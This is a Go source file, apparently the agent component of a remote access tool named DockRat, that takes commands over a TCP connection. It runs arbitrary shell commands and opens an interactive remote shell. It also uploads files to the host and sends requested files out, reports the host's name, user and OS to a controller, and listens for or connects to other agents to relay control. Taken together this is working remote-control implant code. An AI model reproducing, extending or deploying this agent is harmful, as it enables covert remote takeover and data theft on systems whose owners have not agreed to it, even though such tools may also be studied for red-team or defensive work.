package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"

	"strings"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/utils"
	"github.com/creack/pty"
)

var shellStarted = false
var shellStdin io.WriteCloser

var currentUploadFile *os.File

func StartAgent(conn net.Conn) {
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Connection closed or failed: %v", err)
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Failed to read message body: %v", err)
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode error: %v", err)
			continue
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn)
		case protocol.MsgShell:
			handleShellPTY(msg, conn)
		case protocol.MsgUploadInit:
			handleUploadInit(msg)
		case protocol.MsgUploadChunk:
			handleUploadChunk(msg)
		case protocol.MsgUploadDone:
			handleUploadDone()
		case protocol.MsgDownloadInit:
			handleDownloadInit(msg, conn)
		case protocol.MsgListen:
			handleListenCommand(msg)
		case protocol.MsgConnect:
			handleConnectCommand(msg)

		default:
			log.Println("[-] Unknown message type:", msg.Type)
		}
	}
}

func handleCommand(msg protocol.Message, conn net.Conn) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{
		Type:    protocol.MsgResponse,
		Payload: output,
	}
	data, _ := protocol.EncodeMessage(resp)
	conn.Write(data)
}

func handleShellPTY(msg protocol.Message, conn net.Conn) {
	line := string(msg.Payload)

	if !shellStarted {
		cmd := exec.Command("/bin/sh")
		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		shellStarted = true
		shellStdin = ptmx

		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Println("[-] Shell read error:", err)
					return
				}
				msg := protocol.Message{
					Type:    protocol.MsgShell,
					Payload: buf[:n],
				}
				data, err := protocol.EncodeMessage(msg)
				if err != nil {
					log.Println("[-] Shell encode error:", err)
					return
				}
				_, err = conn.Write(data)
				if err != nil {
					log.Println("[-] Shell write error:", err)
					return
				}
			}
		}()
		return
	}

	// 已启动 shell，则写入 stdin
	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	_, err := shellStdin.Write([]byte(line))
	if err != nil {
		log.Println("[-] Write to shell error:", err)
	}
}

func handleUploadInit(msg protocol.Message) {
	var payload protocol.UploadInitPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] UploadInit decode error:", err)
		return
	}

	file, err := os.Create(payload.Filename)
	if err != nil {
		log.Println("[-] Failed to create upload file:", err)
		return
	}

	currentUploadFile = file
	log.Printf("[+] Start receiving file: %s (%d bytes)", payload.Filename, payload.Filesize)
}

func handleUploadChunk(msg protocol.Message) {
	if currentUploadFile == nil {
		log.Println("[-] Received chunk with no open file")
		return
	}

	var chunk protocol.UploadChunkPayload
	if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
		log.Println("[-] Upload chunk decode error:", err)
		return
	}
	_, err := currentUploadFile.Write(chunk.Data)
	if err != nil {
		log.Println("[-] Write chunk failed:", err)
	}
}

func handleUploadDone() {
	if currentUploadFile != nil {
		currentUploadFile.Close()
		currentUploadFile = nil
		log.Println("[+] Upload complete")
	} else {
		log.Println("[-] Upload done received with no open file")
	}
}

func handleDownloadInit(msg protocol.Message, conn net.Conn) {
	var payload protocol.DownloadInitPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] DownloadInit decode error:", err)
		return
	}

	file, err := os.Open(payload.Filename)
	if err != nil {
		log.Println("[-] Cannot open file for download:", err)
		return
	}
	defer file.Close()

	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			chunk := protocol.DownloadChunkPayload{Data: buf[:n]}
			data, _ := json.Marshal(chunk)
			msg := protocol.Message{Type: protocol.MsgDownloadChunk, Payload: data}
			packet, _ := protocol.EncodeMessage(msg)
			conn.Write(packet)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Println("[-] File read error:", err)
			return
		}
	}
	done := protocol.Message{Type: protocol.MsgDownloadDone, Payload: []byte("done")}
	pkt, _ := protocol.EncodeMessage(done)
	conn.Write(pkt)
	log.Println("[+] File download finished")
}

func handleListenCommand(msg protocol.Message) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Listen command decode failed:", err)
		return
	}
	port := payload["port"]
	go func() {
		ln, err := net.Listen("tcp", ":"+port)
		if err != nil {
			log.Println("[-] Agent listen failed:", err)
			return
		}
		log.Println("[+] Agent listening on port", port)
		for {
			conn, err := ln.Accept()
			if err != nil {
				log.Println("[-] Accept failed:", err)
				continue
			}
			go handleChildConn(conn)
		}
	}()
}

func handleConnectCommand(msg protocol.Message) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Connect command decode failed:", err)
		return
	}
	target := payload["target"]
	parentID := payload["parent_id"]

	conn, err := net.Dial("tcp", target)
	if err != nil {
		log.Println("[-] Failed to connect target:", err)
		return
	}
	log.Println("[+] Connected to parent agent", target)

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payloadData := map[string]interface{}{
		"hostname":  hostname,
		"username":  username,
		"os":        runtime.GOOS,
		"parent_id": parentID,
	}
	data, _ := json.Marshal(payloadData)
	msgToSend := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: data,
	}
	packet, _ := protocol.EncodeMessage(msgToSend)
	conn.Write(packet)

	// 开启消息处理
	StartAgent(conn)
}

func handleChildConn(conn net.Conn) {
	log.Println("[+] Received child connection from", conn.RemoteAddr())
	// 直接作为一个独立 agent 启动（中继上报由 admin 处理）
	StartAgent(conn)
}
